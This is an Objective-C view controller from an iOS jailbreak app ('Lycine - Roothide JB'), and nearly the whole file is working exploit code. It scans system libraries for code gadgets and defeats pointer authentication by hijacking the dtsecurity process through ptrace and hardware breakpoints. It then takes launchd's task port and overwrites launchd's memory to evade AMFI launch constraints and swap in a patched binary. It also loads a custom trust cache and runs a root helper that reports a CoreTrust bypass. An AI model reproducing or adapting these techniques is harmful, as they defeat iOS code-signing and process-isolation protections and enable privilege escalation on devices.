//
//  ViewController.m
//  TaskPortHaxxApp
//
//  Created by Duy Tran on 24/10/25.
//

@import Darwin;
@import MachO;
@import XPC;
#include <sys/wait.h>
#import <IOKit/IOKitLib.h>
#import "ProcessContext.h"
#import "ViewController.h"
#import "Header.h"
#import "TSUtil.h"
#import "jbroot.h"
#import "bootstrap.h"

NSDictionary *getLaunchdStringOffsets(void) {
    NSMutableDictionary *dict = [NSMutableDictionary dictionary];
    
    char *path = "/sbin/launchd";
    int fd = open(path, O_RDONLY);
    struct stat s;
    fstat(fd, &s);
    const struct mach_header_64 *map = mmap(NULL, s.st_size, PROT_READ, MAP_SHARED, fd, 0);
    assert(map != MAP_FAILED);
    
    size_t size = 0;
    char *cstring = (char *)getsectiondata(map, SEG_TEXT, "__cstring", &size);
    assert(cstring);
    while (size > 0) {
        dict[@(cstring)] = @(cstring - (char *)map);
        uint64_t off = strlen(cstring) + 1;
        cstring += off;
        size -= off;
    }
    
    munmap((void *)map, s.st_size);
    close(fd);
    return dict;
}

uint64_t getDyldPACIAOffset(uint64_t _dyld_start) {
    void *handle = dlopen("/usr/lib/dyld", RTLD_GLOBAL);
    uint32_t *func = (uint32_t *)dlsym(RTLD_DEFAULT, "_dyld_start");
    uint32_t *dyld_start_func = func;

    // 1. find where `B start`
    for (; (*func & 0xFC000000) != 0x14000000;/* b */ func++) {}
    // printf("B start: %p\n", func);

    // 2. obtain offset where branch
    uint32_t imm26 = *func & 0x3ffffff;
    int32_t off = (int32_t)(imm26 << 2);
    if (imm26 & (1<<25)) off |= 0xFC000000;
    // printf("off: %d\n", off);
    func += off/sizeof(*func);
    // printf("start: %p\n", func);

    // 3. find pacia x16, x8
    for (; (*func & 0xFFFFFFFF) != 0xDAC10110;/* pacia x16, x8 */ func++) {}
    // printf("pacia x16, x8 in start: %p\n", func);
    off = (uint32_t)dyld_start_func - (uint32_t)func;

    uint64_t pacia_inst = _dyld_start - off;
    return pacia_inst;
}

@interface ViewController ()
@property(nonatomic) mach_port_t fakeBootstrapPort;
@property(nonatomic) ProcessContext *dtProc;
@property(nonatomic) ProcessContext *ubProc;
@property(nonatomic) UITextView *logTextView;
@end

@implementation ViewController

- (void)loadTrustCacheTapped {
    // Download arm64 XPC service from Apple which we will use to initiate PAC bypass
    char *path = "/var/mobile/.TrustCache";
    int fd = open(path, O_RDONLY);
    struct stat s;
    fstat(fd, &s);
    void *map = mmap(NULL, s.st_size, PROT_READ, MAP_SHARED, fd, 0);
    assert(map != MAP_FAILED);
    CFDictionaryRef match = IOServiceMatching("AppleMobileFileIntegrity");
    io_service_t svc = IOServiceGetMatchingService(0, match);
    io_connect_t conn;
    IOServiceOpen(svc, mach_task_self_, 0, &conn);
    kern_return_t kr = IOConnectCallMethod(conn, 2, NULL, 0, map, s.st_size, NULL, NULL, NULL, NULL);
    if (kr != KERN_SUCCESS) {
        printf("IOConnectCallMethod failed: %s\n", mach_error_string(kr));
    } else {
        printf("Successfully loaded trust cache from %s\n", path);
    }
    IOServiceClose(conn);
    IOObjectRelease(svc);
    munmap((void *)map, s.st_size);
    close(fd);
}

- (void)viewDidLoad {
    [super viewDidLoad];
    self.navigationItem.title = @"Lycine - Roothide JB";
    self.navigationItem.leftBarButtonItem = [[UIBarButtonItem alloc] initWithTitle:@"Options" menu:[UIMenu menuWithTitle:@"Options" children:@[
        [UIAction actionWithTitle:@"Change Signed Pointer" image:nil identifier:nil handler:^(__kindof UIAction * _Nonnull action) {
            [self changePtrTapped];
        }],
        [UIAction actionWithTitle:@"Userspace reboot" image:nil identifier:nil handler:^(__kindof UIAction * _Nonnull action) {
            [self userspaceRebootTapped];
        }],
        [UIAction actionWithTitle:@"Bootstrap" image:nil identifier:nil handler:^(__kindof UIAction * _Nonnull action) {
            [self bootstrapButtonTapped];
        }],
        [UIAction actionWithTitle:@"Remove Bootstrap" image:nil identifier:nil handler:^(__kindof UIAction * _Nonnull action) {
            [self removeBootstrapTapped];
        }],
        [UIAction actionWithTitle:@"Show JBRoot Info" image:nil identifier:nil handler:^(__kindof UIAction * _Nonnull action) {
            [self showJBRootInfo];
        }]
    ]]];
    self.navigationItem.rightBarButtonItems = @[
        [[UIBarButtonItem alloc] initWithTitle:@"Jailbreak" style:UIBarButtonItemStylePlain target:self action:@selector(arbCallButtonTapped)],
        [[UIBarButtonItem alloc] initWithTitle:@"RootHelper" style:UIBarButtonItemStylePlain target:self action:@selector(rootHelperButtonTapped)],
        [[UIBarButtonItem alloc] initWithTitle:@"Test" style:UIBarButtonItemStylePlain target:self action:@selector(testButtonTapped)]
    ];
    
    UITextView *textView = [[UITextView alloc] initWithFrame:self.view.bounds];
    textView.editable = NO;
    textView.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
    textView.text = @"Log Output:\n";
    textView.font = [UIFont monospacedSystemFontOfSize:14 weight:UIFontWeightRegular];
    [self.view addSubview:textView];
    self.logTextView = textView;
    [self redirectStdio];
    
    // load trust cache if available. though this is only loaded once per boot we check it again
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        if(spawn_stage1_prepare_process() != 0) return;
        
        NSString *assetDir = [NSFileManager.defaultManager URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask].lastObject.path;
        NSString *tcPath = [assetDir stringByAppendingPathComponent:@"AssetData/.TrustCache"];
        if(load_trust_cache(tcPath) == 0) {
            printf("Trust cache loaded.\n");
        } else {
            printf("Failed to load trust cache.\n");
        }
        
        // preflight UpdateBrainService
        [self.ubProc spawnProcess:@"updatebrain" suspended:NO];
        printf("Spawned UpdateBrainService with PID %d\n", self.ubProc.pid);
        
    });
    
    // find launchd string offsets
    NSUserDefaults *defaults = NSUserDefaults.standardUserDefaults;
    if (!defaults.offsetLaunchdPath) {
        NSDictionary *offsets = getLaunchdStringOffsets();
        defaults.offsetLaunchdPath = [offsets[@"/sbin/launchd"] unsignedLongValue];
        // AMFI is only needed for iOS 17.0 to bypass launch constraint
        defaults.offsetAMFI = [offsets[@"AMFI"] unsignedLongValue];
        printf("Found launchd path string offset: 0x%lx\n", defaults.offsetLaunchdPath);
        if (defaults.offsetAMFI) {
            printf("Found AMFI string offset: 0x%lx\n", defaults.offsetAMFI);
        }
    }
    
    self.fakeBootstrapPort = setup_fake_bootstrap_server();
    self.dtProc = [[ProcessContext alloc] initWithExceptionPortName:@"com.kdt.taskporthaxx.dtsecurity_donor_exception_server"];
    self.ubProc = [[ProcessContext alloc] initWithExceptionPortName:@"com.kdt.taskporthaxx.updatebrain_exception_server"];
    
    // TODO: save offsets
    // unauthenticated br x8 gadget
    void *handle = dlopen("/usr/lib/swift/libswiftDistributed.dylib", RTLD_GLOBAL);
    assert(handle != NULL);
    uint32_t *func = (uint32_t *)dlsym(RTLD_DEFAULT, "swift_distributed_execute_target");
    assert(func != NULL);
    for (; *func != 0xd61f0100; func++) {}
    brX8Address = (uint64_t)func;
    printf("Found br x8 at address: 0x%016lx\n", brX8Address);
    // if br x8 != saved address, clear saved address
    uint64_t savedPpointer = NSUserDefaults.standardUserDefaults.signedPointer;
    if (savedPpointer != 0 && (brX8Address&0xFFFFFFFFF) != (savedPpointer&0xFFFFFFFFF)) {
        printf("br x8 address changed, clearing saved signed pointer\n");
        NSUserDefaults.standardUserDefaults.signedPointer = 0;
        NSUserDefaults.standardUserDefaults.signedDiversifier = 0;
    }
    
    // PAC signing gadget
    func = (uint32_t *)zeroify_scalable_zone;
    for (; func[0] != 0xdac10230 || func[1] != 0xf9000110; func++) {}
    paciaAddress = (uint64_t)func;
    printf("Found pacia x16, x17 at address: 0x%016lx\n", paciaAddress);
    
    // change LR gadget
    func = (uint32_t *)dispatch_debug;
    for (; func[0] != 0xaa0103fe || func[1] != 0xf9402008; func++) {}
    changeLRAddress = (uint64_t)func;
}

- (void)redirectStdio {
    setvbuf(stdout, 0, _IOLBF, 0); // make stdout line-buffered
    setvbuf(stderr, 0, _IONBF, 0); // make stderr unbuffered
    
    /* create the pipe and redirect stdout and stderr */
    static int pfd[2];
    pipe(pfd);
    dup2(pfd[1], fileno(stdout));
    dup2(pfd[1], fileno(stderr));
    
    /* create the logging thread */
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        ssize_t rsize;
        char buf[2048];
        while((rsize = read(pfd[0], buf, sizeof(buf)-1)) > 0) {
            if (rsize < 2048) {
                buf[rsize] = '\0';
            }
            NSString *logLine = [NSString stringWithUTF8String:buf];
            dispatch_async(dispatch_get_main_queue(), ^{
                self.logTextView.text = [self.logTextView.text stringByAppendingString:logLine];
                NSRange bottom = NSMakeRange(self.logTextView.text.length -1, 1);
                [self.logTextView scrollRangeToVisible:bottom];
            });
        }
    });
}

- (void)changePtrTapped {
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Change Signed Pointer" message:@"Enter new signed pointer and diversifier value (hex):" preferredStyle:UIAlertControllerStyleAlert];
    [alert addTextFieldWithConfigurationHandler:^(UITextField *textField) {
        textField.placeholder = @"Signed Pointer (hex)";
        textField.keyboardType = UIKeyboardTypeDefault;
        textField.text = [NSString stringWithFormat:@"0x%lx", NSUserDefaults.standardUserDefaults.signedPointer];
    }];
    [alert addTextFieldWithConfigurationHandler:^(UITextField *textField) {
        textField.placeholder = @"Diversifier (hex)";
        textField.keyboardType = UIKeyboardTypeDefault;
        textField.text = [NSString stringWithFormat:@"0x%x", NSUserDefaults.standardUserDefaults.signedDiversifier];
    }];
    UIAlertAction *okAction = [UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:^(UIAlertAction *action) {
        UITextField *textField = alert.textFields.firstObject;
        NSUInteger signedPointer = strtoull(textField.text.UTF8String, NULL, 16);
        uint32_t diversifier = (uint32_t)strtoul(alert.textFields[1].text.UTF8String, NULL, 16);
        NSUserDefaults.standardUserDefaults.signedPointer = signedPointer;
        NSUserDefaults.standardUserDefaults.signedDiversifier = signedPointer ? diversifier : 0;
        printf("Set signed pointer to 0x%lx\n", signedPointer);
    }];
    UIAlertAction *cancelAction = [UIAlertAction actionWithTitle:@"Cancel" style:UIAlertActionStyleCancel handler:nil];
    [alert addAction:okAction];
    [alert addAction:cancelAction];
    [self presentViewController:alert animated:YES completion:nil];
}

- (void)userspaceRebootTapped {
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Userspace Reboot" message:@"This will renew the PAC signature." preferredStyle:UIAlertControllerStyleAlert];
    UIAlertAction *rebootAction = [UIAlertAction actionWithTitle:@"Reboot" style:UIAlertActionStyleDestructive handler:^(UIAlertAction *action) {
        userspaceReboot();
    }];
    UIAlertAction *cancelAction = [UIAlertAction actionWithTitle:@"Cancel" style:UIAlertActionStyleCancel handler:nil];
    [alert addAction:rebootAction];
    [alert addAction:cancelAction];
    [self presentViewController:alert animated:YES completion:nil];
}

- (void)testButtonTapped {
    printf("Currently do nothing\n");
}

- (void)performBypassPAC {
    kern_return_t kr;
    vm_size_t page_size = getpagesize();
    
    [self.dtProc spawnProcess:@"dtsecurity" suspended:YES];
    printf("Spawned dtsecurity with PID %d\n", self.dtProc.pid);
    
    // attach to dtsecurity
    kr = (int)RemoteArbCall(self.ubProc, ptrace, PT_ATTACHEXC, self.dtProc.pid, 0, 0);
    printf("ptrace(PT_ATTACHEXC) returned %d\n", kr);
    kr = (int)RemoteArbCall(self.ubProc, ptrace, PT_CONTINUE, self.dtProc.pid, 1, 0);
    printf("ptrace(PT_CONTINUE) returned %d\n", kr);
    
    while (!self.dtProc.newState) {
#warning TODO: maybe another semaphore
        usleep(200000);
    }
    dtsecurityTaskPort = self.dtProc.taskPort;
    //bootstrap_register(bootstrap_port, "com.kdt.taskporthaxx.dtsecurity_task_port", dtsecurityTaskPort);
    if(!dtsecurityTaskPort) {
        printf("dtsecurity task port is null?\n");
        return;
    }
    
    // create a region which holds temp data
    vm_address_t map = RemoteArbCall(self.ubProc, mmap, 0, page_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (!map) {
        printf("Failed to call mmap\n");
        return;
    }
    
    // Pass dtsecurity task port to UpdateBrainService
    RemoteArbCall(self.ubProc, task_get_special_port, 0x203, TASK_BOOTSTRAP_PORT, map);
    mach_port_t remote_bootstrap_port = [self.ubProc read32:map];
    vm_address_t xpc_bootstrap_pipe = RemoteArbCall(self.ubProc, xpc_pipe_create_from_port, remote_bootstrap_port, 0, map);
    printf("xpc_bootstrap_pipe: 0x%lx\n", xpc_bootstrap_pipe);
    vm_address_t dict = RemoteArbCall(self.ubProc, xpc_dictionary_create_empty);
    vm_address_t keyStr = [self.ubProc writeString:map+0x10 string:"name"];
    vm_address_t valueStr = [self.ubProc writeString:map+0x20 string:"port"];
    RemoteArbCall(self.ubProc, xpc_dictionary_set_string, dict, keyStr, valueStr);
    RemoteArbCall(self.ubProc, _xpc_pipe_interface_routine, xpc_bootstrap_pipe, 0xcf, dict, map, 0);
    vm_address_t reply = [self.ubProc read64:map];
    mach_port_t dtsecurity_task = (mach_port_t)RemoteArbCall(self.ubProc, xpc_dictionary_copy_mach_send, reply, valueStr);
    if (!dtsecurity_task) {
        printf("Failed to get dtsecurity task port from UpdateBrainService\n");
        return;
    }
    printf("Got dtsecurity task port from UpdateBrainService: 0x%x\n", dtsecurity_task);
    
    // Get dtsecurity thread port
    vm_address_t threads = map + 0x10;
    vm_address_t thread_count = map;
    [self.ubProc write32:thread_count value:TASK_BASIC_INFO_64_COUNT];
    kr = (kern_return_t)RemoteArbCall(self.ubProc, task_threads, dtsecurity_task, threads, thread_count);
    if (kr != KERN_SUCCESS) {
        printf("task_threads failed: %s\n", mach_error_string(kr));
        return;
    }
    threads = [self.ubProc read64:threads];
    thread_t dtsecurity_thread = (thread_t)[self.ubProc read32:threads];
    printf("dtsecurity thread port: 0x%x\n", dtsecurity_thread);
    
    // Get dtsecurity debug state
    arm_debug_state64_t *debug_state = (arm_debug_state64_t *)(map + 0x10);
    vm_address_t debug_state_count = map;
    [self.ubProc write32:debug_state_count value:ARM_DEBUG_STATE64_COUNT];
    kr = (kern_return_t)RemoteArbCall(self.ubProc, thread_get_state, dtsecurity_thread, ARM_DEBUG_STATE64, (uint64_t)debug_state, debug_state_count);
    if (kr != KERN_SUCCESS) {
        printf("thread_get_state(ARM_DEBUG_STATE64) failed: %s\n", mach_error_string(kr));
        return;
    }
    
    // Set hardware breakpoint 1 to pacia instruction
    uint64_t _dyld_start = self.dtProc.newState->__pc;
    xpaci(_dyld_start);
    uint64_t pacia_inst = getDyldPACIAOffset(_dyld_start);
    printf("_dyld_start: 0x%llx\n", _dyld_start);
    printf("pacia: 0x%llx\n", pacia_inst);
    [self.ubProc write64:(uint64_t)&debug_state->__bvr[0] value:pacia_inst];
    [self.ubProc write64:(uint64_t)&debug_state->__bcr[0] value:0x1e5];
    kr = (kern_return_t)RemoteArbCall(self.ubProc, thread_set_state, dtsecurity_thread, ARM_DEBUG_STATE64, (uint64_t)debug_state, ARM_DEBUG_STATE64_COUNT);
    if (kr != KERN_SUCCESS) {
        printf("thread_set_state(ARM_DEBUG_STATE64) failed: %s\n", mach_error_string(kr));
        return;
    }
    
    printf("Bypassing PAC right now\n");
    
    // Clear SIGTRAP
    kr = (int)RemoteArbCall(self.ubProc, ptrace, PT_THUPDATE, self.dtProc.pid, dtsecurity_thread, 0);
    RemoteArbCall(self.ubProc, kill, self.dtProc.pid, SIGCONT);
    self.dtProc.expectedLR = 0;
    [self.dtProc resume];
    printf("Resume1:\n");
    printf("PC: 0x%llx\n", self.dtProc.newState->__pc);
    
    // This shall step to pacia instruction
    self.dtProc.expectedLR = (uint64_t)-1;
    [self.dtProc resume];
    printf("Resume2:\n");
    printf("PC: 0x%llx\n", self.dtProc.newState->__pc);
    
    uint64_t currPC = self.dtProc.newState->__pc;
    xpaci(currPC);
    if (currPC != pacia_inst) {
        printf("Did not hit pacia breakpoint?\n");
        return;
    }
    
    printf("We hit PACIA breakpoint!\n");
    self.dtProc.newState->__x[16] = brX8Address;
    self.dtProc.newState->__x[8] = 0x74810000AA000000; // 'pc' discriminator, 0xAA diversifier
    
    // Move our hardware breakpoint to the next instruction after pacia
    // TODO: maybe single step instead?
    [self.ubProc write64:(uint64_t)&debug_state->__bvr[0] value:pacia_inst+4];
    [self.ubProc write64:(uint64_t)&debug_state->__bcr[0] value:0x1e5];
    kr = (kern_return_t)RemoteArbCall(self.ubProc, thread_set_state, dtsecurity_thread, ARM_DEBUG_STATE64, (uint64_t)debug_state, ARM_DEBUG_STATE64_COUNT);
    if (kr != KERN_SUCCESS) {
        printf("thread_set_state(ARM_DEBUG_STATE64) failed: %s\n", mach_error_string(kr));
        return;
    }
    
    [self.dtProc resume];
    printf("Resume3:\n");
    printf("PC: 0x%llx\n", self.dtProc.newState->__pc);
    
    brX8Address = self.dtProc.newState->__x[16];
    printf("Signed Pointer: 0x%lx\n", brX8Address);
    
    // At this point we have corrupted x16 and x8 to sign br x8 gadget, it's quite complicated
    // to continue from here as we need to have a signed pacia beforehand, then sign br x8 and
    // set registers back to repair. Instead we will kill and replace dtsecurity.
    printf("Cleaning up after PAC bypass\n");
    RemoteArbCall(self.ubProc, ptrace, PT_KILL, self.dtProc.pid);
    RemoteArbCall(self.ubProc, kill, self.dtProc.pid, SIGKILL);
    [self.dtProc terminate];
    [self.ubProc terminate];
    self.ubProc = nil;
}

#define RemoteRead32(addr) [self.dtProc read32:addr]
#define RemoteRead64(addr) [self.dtProc read64:addr]
#define RemoteWrite32(addr, value_) [self.dtProc write32:addr value:value_]
#define RemoteWrite64(addr, value_) [self.dtProc write64:addr value:value_]
- (void)arbCallButtonTapped {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        if (*(uint32_t *)getpagesize == 0xd503237f) {
            // we know this is arm64e hardware if some function starts with pacibsp
            [self performBypassPAC];
        }
        
        kern_return_t kr;
        vm_size_t page_size = getpagesize();
        
        self.dtProc = [[ProcessContext alloc] initWithExceptionPortName:@"com.kdt.taskporthaxx.dtsecurity_exception_server"];
        [self.dtProc spawnProcess:@"dtsecurity" suspended:NO];
        printf("Spawned dtsecurity with PID %d\n", self.dtProc.pid);
        
        // Change LR
        while (!self.dtProc.newState) {
#warning TODO: maybe another semaphore
            usleep(200000);
        }
        self.dtProc.newState->__lr = 0xFFFFFF00;
        self.dtProc.newState->__flags &= ~(__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR |
                                           __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR |
                                           __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC);
        
        // Create a region which holds temp data (should we use stack instead?)
        vm_address_t map = RemoteArbCall(self.dtProc, mmap, 0, page_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
        if (!map) {
            printf("Failed to call mmap. Please try resetting pointer and try again\n");
            return;
        }
        printf("Mapped memory at 0x%lx\n", map);
        
        // Test mkdir
//        RemoteWriteString(map, "/tmp/.it_works");
//        RemoteArbCall(self.dtProc, mkdir, map, 0700);
        
        // Get my task port
        mach_port_t dtsecurity_task = (mach_port_t)RemoteArbCall(self.dtProc, task_self_trap);
//        kr = (kern_return_t)RemoteArbCall(self.dtProc, task_for_pid, dtsecurity_task, getpid(), map);
//        if (kr != KERN_SUCCESS) {
//            printf("Failed to get my task port\n");
//            return;
//        }
//        mach_port_t my_task = (mach_port_t)RemoteRead32(map);
        // Map the page we allocated in dtsecurity to this process
//        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_remap, my_task, map, page_size, 0, VM_FLAGS_ANYWHERE, dtsecurity_task, map, false, map+8, map+12, VM_INHERIT_SHARE);
//        if (kr != KERN_SUCCESS) {
//            printf("Failed to create dtsecurity<->haxx shared mapping\n");
//            return;
//        }
//        vm_address_t local_map = RemoteRead64(map);
//        printf("Created shared mapping: 0x%lx\n", local_map);
//        printf("read: 0x%llx\n", *(uint64_t *)local_map);
        
        // Get dtsecurity dyld base for blr x19
        RemoteWrite32((uint64_t)map, TASK_DYLD_INFO_COUNT);
         kr = (kern_return_t)RemoteArbCall(self.dtProc, task_info, dtsecurity_task, TASK_DYLD_INFO, map + 8, map);
        if (kr != KERN_SUCCESS) {
            printf("task_info failed\n");
            return;
        }
        struct dyld_all_image_infos *remote_dyld_all_image_infos_addr = (void *)(RemoteRead64(map + 8) + offsetof(struct task_dyld_info, all_image_info_addr));
        vm_address_t remote_dyld_base;
        do {
            remote_dyld_base = RemoteRead64((uint64_t)&remote_dyld_all_image_infos_addr->dyldImageLoadAddress);
            // FIXME: why do I have to sleep a bit for dyld base to be available?
            usleep(100000);
        } while (remote_dyld_base == 0);
        printf("dtsecurity dyld base: 0x%lx\n", remote_dyld_base);
        
        // Get launchd task port
        kr = (kern_return_t)RemoteArbCall(self.dtProc, task_for_pid, dtsecurity_task, 1, map);
        if (kr != KERN_SUCCESS) {
            printf("Failed to get launchd task port\n");
            return;
        }
        
        mach_port_t launchd_task = (mach_port_t)RemoteRead32(map);
        printf("Got launchd task port: %d\n", launchd_task);
        
        // Get remote dyld base
        RemoteWrite32((uint64_t)map, TASK_DYLD_INFO_COUNT);
        kr = (kern_return_t)RemoteArbCall(self.dtProc, task_info, launchd_task, TASK_DYLD_INFO, map + 8, map);
        if (kr != KERN_SUCCESS) {
            printf("task_info failed\n");
            return;
        }
        remote_dyld_all_image_infos_addr = (void *)(RemoteRead64(map + 8) + offsetof(struct task_dyld_info, all_image_info_addr));
        printf("launchd dyld_all_image_infos_addr: %p\n", remote_dyld_all_image_infos_addr);
        
        // uint32_t infoArrayCount = &remote_dyld_all_image_infos_addr->infoArrayCount;
        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_read_overwrite, launchd_task, (mach_vm_address_t)&remote_dyld_all_image_infos_addr->infoArrayCount, sizeof(uint32_t), map, map + 8);
        if (kr != KERN_SUCCESS) {
            printf("vm_read_overwrite _dyld_all_image_infos->infoArrayCount failed\n");
            return;
        }
        uint32_t infoArrayCount = RemoteRead32(map);
        printf("launchd infoArrayCount: %u\n", infoArrayCount);
        
        //const struct dyld_image_info* infoArray = &remote_dyld_all_image_infos_addr->infoArray;
        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_read_overwrite, launchd_task, (mach_vm_address_t)&remote_dyld_all_image_infos_addr->infoArray, sizeof(uint64_t), map, map + 8);
        if (kr != KERN_SUCCESS) {
            printf("vm_read_overwrite _dyld_all_image_infos->infoArray failed\n");
            return;
        }
        
        // Enumerate images to find launchd base
        vm_address_t launchd_base = 0;
        vm_address_t infoArray = RemoteRead64(map);
        for (int i = 0; i < infoArrayCount; i++) {
            kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_read_overwrite, launchd_task, infoArray + sizeof(uint64_t[i*3]), sizeof(uint64_t), map, map + 8);
            uint64_t base = RemoteRead64(map);
            if (base % page_size) {
                // skip unaligned entries, as they are likely in dsc
                continue;
            }
            printf("Image[%d] = 0x%llx\n", i, base);
            // read magic, cputype, cpusubtype, filetype
            kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_read_overwrite, launchd_task, base, 16, map, map + 16);
            uint64_t magic = RemoteRead32(map);
            if (magic != MH_MAGIC_64) {
                printf("not a mach-o (magic: 0x%x)\n", (uint32_t)magic);
                continue;
            }
            uint32_t filetype = RemoteRead32(map + 12);
            if (filetype == MH_EXECUTE) {
                printf("found launchd executable at 0x%llx\n", base);
                launchd_base = base;
                break;
            }
        }
        
        // Reprotect rw
        // minimum page = 0x5f000;
        vm_offset_t launchd_str_off = NSUserDefaults.standardUserDefaults.offsetLaunchdPath;
        vm_offset_t amfi_str_off = NSUserDefaults.standardUserDefaults.offsetAMFI;
        
        printf("reprotecting 0x%lx\n", (launchd_base + launchd_str_off & ~PAGE_MASK));
        self.dtProc.lr = 0xFFFFFF00; // fix autibsp
        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_protect, launchd_task, launchd_base + launchd_str_off & ~PAGE_MASK, 0x8000, false, PROT_READ | PROT_WRITE | VM_PROT_COPY);
        if (kr != KERN_SUCCESS) {
            printf("vm_protect failed: kr = %s\n", mach_error_string(kr));
            sleep(5);
            return;
        }
        
        // https://github.com/wh1te4ever/TaskPortHaxxApp/commit/327022fe73089f366dcf1d0d75012e6288916b29
        // Bypass panic by launch constraints
        // Method 2: Patch `AMFI` string that being used as _amfi_launch_constraint_set_spawnattr's arguments

        // Patch string `AMFI`
        if(amfi_str_off) {
        const char *newStr = "AAAA\x00";
        [self.dtProc writeString:map string:newStr];
        self.dtProc.lr = 0xFFFFFF00; // fix autibsp
        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_write, launchd_task, launchd_base + amfi_str_off, map, 5);
        if (kr != KERN_SUCCESS) {
            printf("vm_write failed\n");
            sleep(5);
            return;
        }
        }
        [self.dtProc taskHexDump:launchd_base + amfi_str_off size:0x100 task:(mach_port_t)launchd_task map:(uint64_t)map];

        // Overwrite /sbin/launchd string to /var/.launchd
        const char *newPath = "/var/.launchd";
        [self.dtProc writeString:map string:newPath];
        self.dtProc.lr = 0xFFFFFF00; // fix autibsp
        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_write, launchd_task, launchd_base + launchd_str_off, map, strlen(newPath));
        if (kr != KERN_SUCCESS) {
            printf("vm_write failed\n");
            sleep(5);
            return;
        }
        printf("Successfully overwrote launchd executable path string to %s\n", newPath);
        
        // Auto-run roothelper to create persistent patched binary
        printf("\n=== Auto-starting RootHelper ===\n");
        
        NSString *execPath = NSBundle.mainBundle.executablePath;
        NSString *stdOut = nil;
        NSString *stdErr = nil;
        
        int exit_code = spawnRoot(execPath, @[@"roothelper"], &stdOut, &stdErr);
        
        // Print all roothelper output
        if (stdOut && stdOut.length > 0) {
            printf("%s", stdOut.UTF8String);
        }
        if (stdErr && stdErr.length > 0) {
            fprintf(stderr, "%s", stdErr.UTF8String);
        }
        
        if (exit_code == 0) {
            printf("\n✓ RootHelper completed successfully!\n");
            printf("Symlink: /var/.launchd -> /private/preboot/<hash>/hax/launchd\n");
            printf("Status: Patched + ldid + CoreTrust Bypassed\n");
        } else {
            printf("\n✗ RootHelper failed with exit code: %d\n", exit_code);
        }
        printf("=== RootHelper finished ===\n\n");

        //RemoteArbCall(self.dtProc, exit, 0);

        // stuff
//        uint64_t remote_list = map + sizeof(uint64_t);
//        RemoteArbCall(self.dtProc, task_threads, launchd_task, remote_list, map);
//        mach_msg_type_number_t listCnt = *(uint32_t *)local_map;
//        RemoteArbCall(self.dtProc, memcpy, remote_list, RemoteRead64(remote_list), listCnt * sizeof(uint64_t));
//        thread_act_array_t act_list = (void *)local_map + sizeof(uint64_t);
//        for (int i = 0; i < listCnt; i++) {
//            printf("Thread[%d] = 0x%x\n", i, act_list[i]);
//            // panic your launchd
//            RemoteArbCall(self.dtProc, thread_abort, act_list[i]);
//        }
        
//        arm_thread_state64_internal ts;
//        RemoteArbCall(self.dtProc, memset, map+0x10, 0x41, sizeof(ts));
//        kr = RemoteArbCall(self.dtProc, thread_create_running, launchd_task, ARM_THREAD_STATE64, (uint64_t)(map+0x10), ARM_THREAD_STATE64_COUNT, (uint64_t)map);
//        printf("thread_create_running returned %d\n", kr);
//        thread_act_t tid = RemoteRead32(map);
//        printf("tid: 0x%x\n", tid);
        
//        printf("Sleeping...\n");
//        RemoteArbCall(self.dtProc, sleep, 10);
        
        // Get remote dyld base for blr x19
//        mach_port_t remote_task = (mach_port_t)RemoteArbCall(self.dtProc, task_self_trap);
//        RemoteWrite32((uint64_t)map, TASK_DYLD_INFO_COUNT);
//        kern_return_t kr = (kern_return_t)RemoteArbCall(self.dtProc, task_info, remote_task, TASK_DYLD_INFO, map + 8, map);
//        if (kr != KERN_SUCCESS) {
//            printf("task_info failed\n");
//            return;
//        }
//        struct dyld_all_image_infos *remote_dyld_all_image_infos_addr = (void *)RemoteRead64(map + 8) + offsetof(struct task_dyld_info, all_image_info_addr);
//        vm_address_t remote_dyld_base;
//        do {
//            remote_dyld_base = RemoteRead64((uint64_t)&remote_dyld_all_image_infos_addr->dyldImageLoadAddress);
//            printf("Remote dyld base: 0x%lx\n", remote_dyld_base);
//            // FIXME: why do I have to sleep a bit for dyld base to be available?
//            usleep(100000);
//        } while (remote_dyld_base == 0);
//        blrX19Address = remote_dyld_base + blrX19Offset;
        
        // We have some unitialized variables in xpc since we crashed here, so we need to fix them up
//        RemoteArbCall(self.dtProc, task_get_special_port, 0x203, TASK_BOOTSTRAP_PORT, map);
//        mach_port_t remote_bootstrap_port = RemoteRead32(map);
//        RemoteWriteString(map, "_os_alloc_once_table");
//        struct _os_alloc_once_s *remote_os_alloc_once_table = (struct _os_alloc_once_s *)RemoteArbCall(self.dtProc, dlsym, (uint64_t)RTLD_DEFAULT, map);
//        struct xpc_global_data *globalData = (struct xpc_global_data *)RemoteArbCall(self.dtProc, _os_alloc_once, (uint64_t)&remote_os_alloc_once_table[1], 472, 0);
//        RemoteWrite64((uint64_t)&remote_os_alloc_once_table[1].once, 0xFFFFFFFFFFFFFFFF);
//        vm_address_t xpc_bootstrap_pipe = RemoteArbCall(self.dtProc, xpc_pipe_create_from_port, remote_bootstrap_port, 0);
//        //RemoteRead64((uint64_t)&globalData->xpc_bootstrap_pipe);
//        printf("xpc_bootstrap_pipe: 0x%lx\n", xpc_bootstrap_pipe);
//        RemoteWrite64((uint64_t)&globalData->xpc_bootstrap_pipe, xpc_bootstrap_pipe);
        
//        RemoteArbCall(self.dtProc, (void*)dlopen, 0x41414141, 0);
//        printf("--- MARK: DONE FUNCTION CALL ---\n");
